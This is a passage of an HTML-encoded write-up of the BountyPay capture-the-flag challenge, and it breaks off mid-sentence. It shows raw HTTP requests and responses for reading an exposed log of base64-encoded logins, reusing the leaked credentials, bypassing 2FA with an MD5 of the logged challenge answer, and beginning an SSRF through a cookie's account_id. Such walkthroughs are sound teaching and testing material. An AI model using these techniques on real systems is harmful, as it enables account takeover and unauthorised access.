class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;:\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nb\"\u003ebase64_encode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003ejson_encode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$data\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nx\"\u003eFILE_APPEND\u003c/span\u003e   \u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eMy first thought was the access \u003ccode\u003e/logger.php\u003c/code\u003e endpoint, but that didn\u0026#39;t exist. I then tried accessing \u003ccode\u003e/bp_web_trace.log\u003c/code\u003e and that worked!\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"nf\"\u003eGET\u003c/span\u003e \u003cspan class=\"nn\"\u003e/bp_web_trace.log\u003c/span\u003e \u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eHost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapp.bountypay.h1ctf.com\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e \u003cspan class=\"m\"\u003e200\u003c/span\u003e \u003cspan class=\"ne\"\u003eOK\u003c/span\u003e\n\n1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==\n1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==\n1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19\n1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI also tried checking both \u003ccode\u003e/logger.php\u003c/code\u003e and \u003ccode\u003e/bp_web_trace.log\u003c/code\u003eon the other subdomains, just in case similar code was deployed there as well, but that didn\u0026#39;t work.\u003c/p\u003e\n\n\u003cp\u003eDecoding the base64-encoded log entries gives us:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight json\"\u003e\u003ccode\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;IP\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;192.168.1.1\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;URI\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;METHOD\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;GET\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;PARAMS\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;GET\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:[],\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;POST\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:[]}}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;IP\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;192.168.1.1\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;URI\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;METHOD\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;POST\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;PARAMS\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;GET\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:[],\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;POST\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;username\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;brian.oliver\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;password\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;V7h0inzX\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e}}}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;IP\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;192.168.1.1\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;URI\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;METHOD\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;POST\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;PARAMS\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;GET\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:[],\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;POST\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;username\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;brian.oliver\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;password\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;V7h0inzX\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;challenge_answer\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;bD83Jk27dQ\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e}}}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;IP\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;192.168.1.1\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;URI\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003estatements\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;METHOD\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;GET\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;PARAMS\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;GET\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;month\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;04\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;year\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;2020\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e},\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;POST\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:[]}}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eOk, so we have a username and password (and also something called \u003ccode\u003echallenge_answer\u003c/code\u003e).\u003c/p\u003e\n\n\u003ch2 id=\"login-2fa-bypass\"\u003eLogin 2FA Bypass\u003c/h2\u003e\n\n\u003cp\u003eWhen we try to login using these credentials, we\u0026#39;re presented with a 2FA challenge:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"nf\"\u003ePOST\u003c/span\u003e \u003cspan class=\"nn\"\u003e/\u003c/span\u003e \u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eHost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapp.bountypay.h1ctf.com\u003c/span\u003e\n\nusername=brian.oliver\u0026amp;password=V7h0inzX\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;form\u003c/span\u003e \u003cspan class=\"na\"\u003emethod=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;post\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eaction=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;/\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;username\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;brian.oliver\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;password\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;V7h0inzX\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;challenge\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;8de5d288e39ef1beaa3833100a14aa47\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;panel panel-default\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003estyle=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;margin-top:50px\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;panel-heading\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003eLogin\u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;panel-body\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003estyle=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;margin-top:7px\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;label\u0026gt;\u003c/span\u003eFor Security we\u0026#39;ve sent a 10 character password to your mobile phone, please enter it below\u003cspan class=\"nt\"\u003e\u0026lt;/label\u0026gt;\u0026lt;/div\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003estyle=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;margin-top:7px\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;label\u0026gt;\u003c/span\u003ePassword contains characters between A-Z , a-z and 0-9\u003cspan class=\"nt\"\u003e\u0026lt;/label\u0026gt;\u0026lt;/div\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"nt\"\u003e\u0026lt;div\u0026gt;\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;challenge_answer\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;form-control\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;/div\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;submit\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;btn btn-success pull-right\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Login\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/form\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSo we have a \u003ccode\u003echallenge\u003c/code\u003e parameter that looks like an MD5 hash (unique for every new request) that we need to find the valid \u003ccode\u003echallenge_answer\u003c/code\u003e for. Recall that we saw \u003ccode\u003echallenge_answer\u003c/code\u003e from Brian\u0026#39;s authentication already in the log. Odd part there was that the log contained \u003ccode\u003echallenge_answer\u003c/code\u003e and not \u003ccode\u003echallenge\u003c/code\u003e - but that must have been done on purpose. It most likely means that the \u003ccode\u003echallenge\u003c/code\u003e and \u003ccode\u003echallenge_answer\u003c/code\u003e could be re-used, so \u003ccode\u003echallenge\u003c/code\u003e was removed it would otherwise be too easy. So maybe instead of trying to find \u003ccode\u003echallenge_answer\u003c/code\u003e for the new \u003ccode\u003echallenge\u003c/code\u003e hash that we\u0026#39;re given, we should find \u003ccode\u003echallenge\u003c/code\u003e for that \u003ccode\u003echallenge_answer\u003c/code\u003e submitted by Brian?\u003c/p\u003e\n\n\u003cp\u003eSo it\u0026#39;s clearly an MD5 hash of something. It is also unique on each page reload, so there must be something unique about the string being hashed. That rules out the most obvious things like \u003ccode\u003eusername\u003c/code\u003e etc. If it was really sufficiently random then we could never break it, so let\u0026#39;s stay positive and assume that it\u0026#39;s a unique thing - but something that we actually know. The only such thing that we have is actually the \u003ccode\u003echallenge_answer\u003c/code\u003e itself! I can\u0026#39;t say this part of the CTF was \u0026quot;obvious\u0026quot; (and it did take me half an hour or so), but it was still a very logical conclusion if you carefully think it through.\u003c/p\u003e\n\n\u003cp\u003eAnd indeed, taking MD5 hash of \u003ccode\u003ebD83Jk27dQ\u003c/code\u003e and submitting that as the \u003ccode\u003echallenge\u003c/code\u003ebypasses the 2FA:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"nf\"\u003ePOST\u003c/span\u003e \u003cspan class=\"nn\"\u003e/\u003c/span\u003e \u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eHost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapp.bountypay.h1ctf.com\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Type\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapplication/x-www-form-urlencoded\u003c/span\u003e\n\nusername=brian.oliver\u0026amp;password=V7h0inzX\u0026amp;challenge=5828c689761cce705a1c84d9b1a1ed5e\u0026amp;challenge_answer=bD83Jk27dQ\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e \u003cspan class=\"m\"\u003e302\u003c/span\u003e \u003cspan class=\"ne\"\u003eFound\u003c/span\u003e\n\u003cspan class=\"na\"\u003eSet-Cookie\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003etoken=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9; expires=Mon, 29-Jun-2020 23:36:42 GMT; Max-Age=2592000\u003c/span\u003e\n\u003cspan class=\"na\"\u003eLocation\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e/\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"ssrf\"\u003eSSRF\u003c/h2\u003e\n\n\u003cp\u003eFirst thing we notice is that the session cookie is base64-encoded JSON. When decoded, it is:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e{\u0026quot;account_id\u0026quot;:\u0026quot;F8gHiqSdpK\u0026quot;,\u0026quot;hash\u0026quot;:\u0026quot;de235bffd23df6995ad4e0930baac1a2\u0026quot;}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIt\u0026#39;s very interesting and unusual to see a parameter like \u003ccode\u003eaccount_id\u003c/code\u003e here, so let\u0026#39;s take note of that.\u003c/p\u003e\n\n\u003cp\u003eAnother piece of information we have now is the javascript file \u003ca href=\"/redirect?url=https%3A%2F%2Fapp.bountypay.h1ctf.com%2Fjs%2Fapp.js\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eapp.js\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. It references the following endpoint: \u003ccode\u003e\u0026lt;a href=\u0026quot;/pay/\u0026#39; + s.id + \u0026quot;/\u0026quot; + s.hash\u003c/code\u003e, but upon trying to access something like \u003ccode\u003e/pay/1/1\u003c/code\u003e we get \u003ccode\u003epage not found!\u003c/code\u003e response. It clearly needs some valid \u003ccode\u003eid\u003c/code\u003e and \u003ccode\u003ehash\u003c/code\u003e values that we do not have at this stage. Judging from the code, it looks like that endpoint could be used to make the payment to hackers, which is the storyline of this CTF, so it\u0026#39;ll likely be needed towards the end of the CTF. \u003c/p\u003e\n\n\u003cp\u003eThe only other endpoint we can access, is the one that fetches statements:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"nf\"\u003eGET\u003c/span\u003e \u003cspan class=\"nn\"\u003e/statements?month=04\u0026amp;year=2020\u003c/span\u003e \u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eHost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapp.bountypay.h1ctf.com\u003c/span\u003e\n\u003cspan class=\"na\"\u003eCookie\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003etoken=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e \u003cspan class=\"m\"\u003e200\u003c/span\u003e \u003cspan class=\"ne\"\u003eOK\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Type\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapplication/json\u003c/span\u003e\n\n\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;url\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;https:\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003eapi.bountypay.h1ctf.com\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003eapi\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003eaccounts\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003eF8gHiqSdpK\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003estatements?month=04\u0026amp;year=2020\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;data\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;{\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003edescription\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e:\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eTransactions for 2020-04\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e,\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003etransactions\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e:[]}\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eJust in case, I\u0026#39;ve tried to check a range of other year/month combinations (using \u003ccode\u003eCluster bomb\u003c/code\u003eAttack type within Burp\u0026#39;s Intruder) but none returned any valid transactions.\u003c/p\u003e\n\n\u003cp\u003eLooking at the response, it is clear the endpoint performs a server-side request to retrieve the data (and it also must have a valid token to authenticate with \u003ccode\u003eapi\u003c/code\u003e subdomain). Somewhat unusually, it even shows us the full URL! This smells a lot like SSRF. First thing I\u0026#39;ve tried was fiddling with \u003ccode\u003emonth\u003c/code\u003e and \u003ccode\u003eyear\u003c/code\u003e parameters but it didn\u0026#39;t yield anything interesting (and even if it did, it wouldn\u0026#39;t be of much value as they are in query string, so we couldn\u0026#39;t even do path traversal with that). What else can we control within this API request? It must be the account id that we saw in our session cookie before.. there\u0026#39;s simply nothing else.\u003c/p\u003e\n\n\u003cp\u003eAnd indeed  that worked. Let\u0026#39;s try e.g. adding a 